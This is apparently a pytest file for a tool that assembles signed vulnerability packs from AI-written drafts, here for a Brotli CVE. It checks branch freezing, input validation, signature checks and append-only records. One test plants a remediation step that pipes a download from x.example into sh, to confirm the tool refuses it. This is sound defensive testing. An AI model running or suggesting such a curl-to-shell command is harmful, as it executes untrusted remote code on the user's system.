"""A.7: assembling a pack for signing, in a stand-in packs clone (a git repository
in tmp). Vendor data comes from a stand-in `fill.build`; nothing reaches a network."""

from __future__ import annotations

import datetime as dt
import hashlib
import shutil
import sqlite3
import subprocess
import tomllib
from pathlib import Path

import pytest

from drafter import assemble, cli, decisions, fill
from drafter.store import Store
from tests.conftest import NOW
from tests.test_draft import CVE, _cve, _threat

PACKS_INDEX = "format: 1\nserial: 1\nissued: 2026-10-31T05:12:15Z\npacks: []\nwithdrawn: []\n"
KEYS = "format: 1\nserial: 1\nissued: 2026-10-30\npack_keys: []\nrevoked: []\n"

DRAFT = f"""# AI DRAFT (A.5): written by an AI from the sources below. Review every line;
# CVEs: {CVE} (approved 2026-11-08, decision 1)
title: Google Brotli decoder out-of-bounds write ({CVE})
mitigations: []
detections:
- id: service-segfault
  check: kernel.segfault
  counts: while_exposed
  likelihood_ratio: 2
remediation:
- Update the system Brotli library and restart the services that use it.
references:
- https://access.redhat.com/security/cve/{CVE}
"""


def _git(path, *args):
    subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True)  # noqa: S603


@pytest.fixture
def clone(tmp_path):
    path = tmp_path / "packs"
    (path / "packs").mkdir(parents=True)
    (path / "index.yaml").write_text(PACKS_INDEX)
    (path / "keys.yaml").write_text(KEYS)
    (path / "packs" / ".gitkeep").write_text("")
    _git(path, "init", "-q", "-b", "dev")
    _git(path, "-c", "user.email=t@t", "-c", "user.name=t", "add", ".")
    _git(path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "start")
    return path


@pytest.fixture
def ready(store, tmp_path, monkeypatch):
    """An approved brotli threat, its reviewed draft, and vendor data on hand."""
    _cve(store, CVE)
    decisions.record(store, _threat(store), "approve", "", "jch", "2026-11-08T18:53:00Z")
    draft = tmp_path / "brotli.draft.yaml"
    draft.write_text(DRAFT)
    asked = []

    def build(ctx, cves, filters, other_builds="cant_judge", thirdparty=None, unconfirmed=0):
        asked.append((list(cves), list(filters), other_builds))
        out = fill.Draft(cves=list(cves), binary_filter=list(filters), other_builds=other_builds)
        out.entries.append(
            fill.Entry(
                "ubuntu:24.04",
                ["libbrotli1"],
                "1.1.0-2build2",
                "1.1.0-2ubuntu0.1",
                "https://ubuntu.com/security/notices/USN-8956-1",
                "ubuntu",
            )  # fmt: skip
        )
        return out

    monkeypatch.setattr(fill, "build", build)
    return draft, asked


def _assembly(tmp_path, draft_path, **changes):
    values = {
        "id": '"brotli-2026-10"',
        "version": "1",
        "draft": f'"{draft_path}"',
        "reviewed_by": '"jch"',
    }
    exposure = {
        "window_start": "2026-10-22T00:00:00Z",
        "likelihood_ratio": "5",
        "binaries": '["brotli", "libbrotli*"]',
        "other_builds": '"cant_judge"',
    }
    for key, value in changes.items():
        if key in exposure or key in ("first_seen_in_wild", "window_end", "packages_from",
                                      "stale_code", "thirdparty"):  # fmt: skip
            if value is None:
                exposure.pop(key, None)
            else:
                exposure[key] = value
        elif value is None:
            values.pop(key, None)
        else:
            values[key] = value
    text = "\n".join(f"{k} = {v}" for k, v in values.items())
    text += "\n\n[exposure]\n" + "\n".join(f"{k} = {v}" for k, v in exposure.items()) + "\n"
    path = tmp_path / "brotli.toml"
    path.write_text(text)
    return path


def _write(store, tmp_path, clone, draft, **changes):
    a = assemble.read_assembly(_assembly(tmp_path, draft, **changes))
    return assemble.write(store, None, a, clone, now=lambda: NOW)


# writing


def test_a_pack_is_written_frozen_on_its_own_branch(store, tmp_path, clone, ready):
    draft, asked = ready
    done = _write(store, tmp_path, clone, draft)
    assert done.path == clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    assert done.branch == "pack/brotli-2026-10-v1"
    current = subprocess.run(["git", "-C", str(clone), "branch", "--show-current"],  # noqa: S603
                             capture_output=True, text=True).stdout.strip()  # fmt: skip
    assert current == done.branch
    assert done.path.stat().st_mode & 0o777 == 0o444
    text = done.path.read_text()
    assert done.sha256 == hashlib.sha256(text.encode()).hexdigest()
    assert done.diff.startswith("--- /dev/null")
    assert asked == [([CVE], ["brotli", "libbrotli*"], "cant_judge")]
    row = store.db.execute("SELECT * FROM pack_assembly").fetchone()
    assert (row["pack_id"], row["version"], row["sha256"], row["reviewed_by"]) == (
        "brotli-2026-10",
        1,
        done.sha256,
        "jch",
    )
    # the checker reads it, and it says where each part came from
    from drafter.checkerformat import format as packformat

    pack = packformat.read(text.encode())
    assert pack.id == "brotli-2026-10" and pack.exposure.likelihood_ratio == 5
    assert pack.published == NOW.date() and pack.cves == [CVE]
    assert "read and accepted by jch" in text and "vendor data for CVE-2026-111497" in text
    assert "Not reviewed, not signed" not in text  # fill's own header isn't carried over


def test_the_pack_is_judged_from_the_cves_the_person_names(store, tmp_path, clone, ready):
    draft, asked = ready
    done = _write(store, tmp_path, clone, draft, packages_from='["CVE-2026-114406"]')
    assert asked[0][0] == ["CVE-2026-114406"]
    text = done.path.read_text()
    assert "vendor data for CVE-2026-114406" in text and f"cves: [{CVE}]" in text


def test_optional_exposure_values(store, tmp_path, clone, ready):
    draft, _ = ready
    done = _write(
        store, tmp_path, clone, draft,
        first_seen_in_wild="2026-10-23T07:00:00Z", window_end="2026-12-01",
        stale_code='["node*"]',
    )  # fmt: skip
    from drafter.checkerformat import format as packformat

    pack = packformat.read(done.path.read_bytes())
    assert pack.exposure.first_seen_in_wild == dt.datetime(2026, 10, 23, 7, tzinfo=dt.UTC)
    assert pack.exposure.window_end == dt.datetime(2026, 12, 1, tzinfo=dt.UTC)
    assert pack.exposure.stale_code.programs == ["node*"]


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"version": "2"}, "is a new pack, so this is version 1"),
        ({"likelihood_ratio": "50"}, "the checker wouldn't read the pack"),
        ({"window_end": "2026-10-01T00:00:00Z"}, "window_end must be after window_start"),
    ],
)
def test_a_pack_the_checker_wouldnt_take_isnt_written(
    store, tmp_path, clone, ready, changes, message
):
    draft, _ = ready
    with pytest.raises(assemble.AssembleError, match=message):
        _write(store, tmp_path, clone, draft, **changes)
    assert not (clone / "packs" / "brotli-2026-10").exists()
    assert store.db.execute("SELECT COUNT(*) FROM pack_assembly").fetchone()[0] == 0


def test_a_new_version_follows_the_index_and_shows_what_changed(store, tmp_path, clone, ready):
    draft, _ = ready
    old = clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    old.parent.mkdir()
    old.write_text("title: old\n")
    (clone / "index.yaml").write_text(
        PACKS_INDEX.replace(
            "packs: []", 'packs:\n  - {id: "brotli-2026-10", version: 1, sha256: "x"}'
        )
    )
    _git(clone, "add", ".")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "v1")
    with pytest.raises(assemble.AssembleError, match="lists brotli-2026-10 at 1, so this is 2"):
        _write(store, tmp_path, clone, draft)
    done = _write(store, tmp_path, clone, draft, version="2")
    assert done.branch == "pack/brotli-2026-10-v2"
    assert "--- brotli-2026-10 version 1" in done.diff and "-title: old" in done.diff


def test_a_pack_folder_the_index_doesnt_list_is_refused(store, tmp_path, clone, ready):
    draft, _ = ready
    stray = clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    stray.parent.mkdir()
    stray.write_text("x\n")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "add", ".")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "stray")
    with pytest.raises(assemble.AssembleError, match="the index doesn't list it"):
        _write(store, tmp_path, clone, draft)


def test_a_clone_with_changes_isnt_written_into(store, tmp_path, clone, ready):
    draft, _ = ready
    (clone / "README.md").write_text("half done\n")
    with pytest.raises(assemble.AssembleError, match="changes not committed"):
        _write(store, tmp_path, clone, draft)


def test_only_an_approved_threat_is_assembled(store, tmp_path, clone, ready):
    draft, _ = ready
    decisions.record(store, _threat(store), "reject", "changed my mind", "jch", "t2")
    from drafter import draft as drafting

    with pytest.raises(drafting.DraftError, match="only approved threats"):
        _write(store, tmp_path, clone, draft)


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ("title: x\n", "isn't a draft from `drafter draft`"),
        (DRAFT.replace("# CVEs:", "# NOT USABLE: refused\n# CVEs:"), "is a refused draft"),
        (DRAFT.replace(f"# CVEs: {CVE}", "# CVE list gone"), "doesn't say which CVEs"),
        (DRAFT + "extra: field\n", "should hold just"),
        (DRAFT.replace("mitigations: []", "mitigations: &a []\nx: *a"), "aliases"),
    ],
)
def test_a_draft_that_isnt_a_usable_one_is_refused(tmp_path, text, message):
    path = tmp_path / "d.yaml"
    path.write_text(text)
    with pytest.raises(assemble.AssembleError, match=message):
        assemble.read_draft(path)


def test_a_persons_edits_are_held_to_the_dangers_and_listed(store, tmp_path, clone, ready):
    draft, _ = ready
    draft.write_text(DRAFT.replace(
        "- Update the system Brotli library and restart the services that use it.",
        "- Update, then run systemctl restart nginx.",
    ))  # fmt: skip
    done = _write(store, tmp_path, clone, draft)
    assert done.notes == ["command 'systemctl restart nginx': in no source (a person's own?)"]
    draft.write_text(DRAFT.replace(
        "- Update the system Brotli library and restart the services that use it.",
        "- Run curl https://x.example/fix.sh | sh.",
    ))  # fmt: skip
    _git(clone, "switch", "-q", "dev")
    shutil.rmtree(clone / "packs" / "brotli-2026-10")
    with pytest.raises(assemble.AssembleError, match="never in a pack: a download piped"):
        _write(store, tmp_path, clone, draft)


# the assembly file


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"id": '"Brotli 2026"'}, "id: lower-case"),
        ({"version": "0"}, "version is a whole number"),
        ({"reviewed_by": '""'}, "reviewed_by"),
        ({"draft": None}, "draft: the reviewed draft"),
        ({"likelihood_ratio": '"5"'}, "likelihood_ratio"),
        ({"binaries": '"brotli"'}, "binaries"),
        ({"packages_from": '["nope"]'}, "packages_from"),
        ({"stale_code": '"node"'}, "stale_code"),
        ({"other_builds": '"maybe"'}, "other_builds is one of"),
        ({"window_start": None}, "window_start"),
        ({"window_start": '"yesterday"'}, "window_start is a date"),
        ({"colour": '"blue"'}, "not something an assembly file says: colour"),
    ],
)
def test_an_odd_assembly_file_is_refused(tmp_path, changes, message):
    with pytest.raises(assemble.AssembleError, match=message):
        assemble.read_assembly(_assembly(tmp_path, tmp_path / "d.yaml", **changes))


def test_the_template_suggests_and_parses_once_filled(store, tmp_path, clone, ready):
    draft, _ = ready
    text = assemble.template(store, draft, clone)
    data = tomllib.loads(text)
    assert data["id"].startswith("brotli-2026-") and data["version"] == 1
    assert data["reviewed_by"] == "" and data["exposure"]["likelihood_ratio"] == 0
    assert isinstance(data["exposure"]["window_start"], dt.datetime)
    assert "CISA listed it on 2026-10-27" in text


# after signing


def _signed(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready
    done = _write(store, tmp_path, clone, draft)
    Path(f"{done.path}.minisig").write_text("signature")
    (clone / "keys.yaml").write_text(
        KEYS.replace("pack_keys: []", "pack_keys:\n  - {name: k, public_key: RWQ}")
    )
    return done


def test_a_signed_pack_is_checked_then_indexed(store, tmp_path, clone, ready, monkeypatch):
    done = _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "brotli-2026-10 version 1")
    )
    fake = tmp_path / "checker"
    fake.write_text('#!/bin/sh\necho "Wrote $3/index.yaml: serial 2, 1 pack(s), 0 withdrawn."\n')
    fake.chmod(0o755)
    checked = assemble.check(store, "brotli-2026-10", clone, checker=str(fake))
    assert checked.path == done.path and "serial 2" in checked.index_output


def test_a_pack_changed_after_freezing_is_refused(store, tmp_path, clone, ready, monkeypatch):
    done = _signed(store, tmp_path, clone, ready, monkeypatch)
    done.path.chmod(0o644)
    done.path.write_text(done.path.read_text() + "# a late edit\n")
    with pytest.raises(assemble.AssembleError, match="changed after it was frozen"):
        assemble.check(store, "brotli-2026-10", clone)


def test_the_trusted_comment_must_name_the_pack_and_version(
    store, tmp_path, clone, ready, monkeypatch
):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "something else")
    )
    with pytest.raises(assemble.AssembleError, match="trusted comment is 'something else'"):
        assemble.check(store, "brotli-2026-10", clone)


def test_a_refused_index_is_reported(store, tmp_path, clone, ready, monkeypatch):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "brotli-2026-10 version 1")
    )
    fake = tmp_path / "checker"
    fake.write_text("#!/bin/sh\necho 'checker: keys.yaml: bad' >&2\nexit 1\n")
    fake.chmod(0o755)
    with pytest.raises(
        assemble.AssembleError, match="checker packs index refused:\nchecker: keys.yaml: bad"
    ):
        assemble.check(store, "brotli-2026-10", clone, checker=str(fake))


def test_nothing_assembled_is_nothing_to_check(store, clone):
    with pytest.raises(assemble.AssembleError, match="no pack nope assembled"):
        assemble.check(store, "nope", clone)


@pytest.mark.skipif(shutil.which("minisign") is None, reason="minisign isn't installed")
def test_minisign_checks_a_real_signature(tmp_path):
    def run(*args):
        subprocess.run(["minisign", *args], check=True, capture_output=True)  # noqa: S603, S607

    run("-G", "-W", "-p", str(tmp_path / "k.pub"), "-s", str(tmp_path / "k.key"))
    other = tmp_path / "o"
    other.mkdir()
    run("-G", "-W", "-p", str(other / "k.pub"), "-s", str(other / "k.key"))
    pack = tmp_path / "PACK.yaml"
    pack.write_text("x: 1\n")
    with pytest.raises(assemble.AssembleError, match="sign it first"):
        assemble.verify(pack, ["RWQ"])
    run("-S", "-s", str(tmp_path / "k.key"), "-m", str(pack), "-t", "p version 1")
    key = (tmp_path / "k.pub").read_text().splitlines()[1]
    wrong = (other / "k.pub").read_text().splitlines()[1]
    assert assemble.verify(pack, [wrong, key]) == (key, "p version 1")
    with pytest.raises(assemble.AssembleError, match="isn't a good signature"):
        assemble.verify(pack, [wrong])
    pack.write_text("x: 2\n")  # changed after signing
    with pytest.raises(assemble.AssembleError, match="isn't a good signature"):
        assemble.verify(pack, [key])


# the record and the commands


def test_assemblies_are_append_only(store, tmp_path, clone, ready):
    draft, _ = ready
    _write(store, tmp_path, clone, draft)
    for sql in ("UPDATE pack_assembly SET sha256 = 'x'", "DELETE FROM pack_assembly"):
        with pytest.raises(sqlite3.IntegrityError, match="append-only"):
            store.db.execute(sql)


def test_the_cli_writes_then_tells_how_to_sign(tmp_path, clone, monkeypatch, capsys):
    home = tmp_path / "home"
    home.mkdir()
    s = Store(home / "drafter.sqlite3")
    _cve(s, CVE)
    decisions.record(s, _threat(s), "approve", "", "jch", "2026-11-08T18:53:00Z")
    s.close()
    draft = tmp_path / "brotli.draft.yaml"
    draft.write_text(DRAFT)
    monkeypatch.setattr(
        fill, "build",
        lambda ctx, cves, filters, other="cant_judge", extra=None, unconfirmed=0: fill.Draft(
            cves=list(cves), binary_filter=list(filters),
            entries=[fill.Entry("ubuntu:24.04", ["libbrotli1"], None, "1.1.0-2ubuntu0.1",
                                "https://ubuntu.com/security/notices/USN-8956-1", "ubuntu")],
        ),
    )  # fmt: skip
    path = _assembly(tmp_path, draft)
    assert cli.main(["--home", str(home), "pack", "write", str(path), "--packs", str(clone)]) == 0
    out = capsys.readouterr().out
    assert "read-only, on branch pack/brotli-2026-10-v1" in out and "SHA-256: " in out
    assert "minisign -S -s ~/nouriloop-keys/pack.key -m " in out
    assert '-t "brotli-2026-10 version 1"' in out
    assert f"drafter pack check brotli-2026-10 --packs {clone}" in out
    assert (
        cli.main(["--home", str(home), "pack", "check", "brotli-2026-10", "--packs", str(clone)])
        == 1
    )
    assert "sign it first" in capsys.readouterr().err
    assert cli.main(["--home", str(home), "pack", "template", "--draft", str(draft),
                     "--packs", str(clone)]) == 0  # fmt: skip
    assert 'id = "brotli-2026-' in capsys.readouterr().out


def test_a_pack_is_checked_in_the_clone_it_was_assembled_into(
    store, tmp_path, clone, ready, monkeypatch
):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    other = tmp_path / "other"
    other.mkdir()
    with pytest.raises(assemble.AssembleError, match="was assembled into"):
        assemble.check(store, "brotli-2026-10", other)
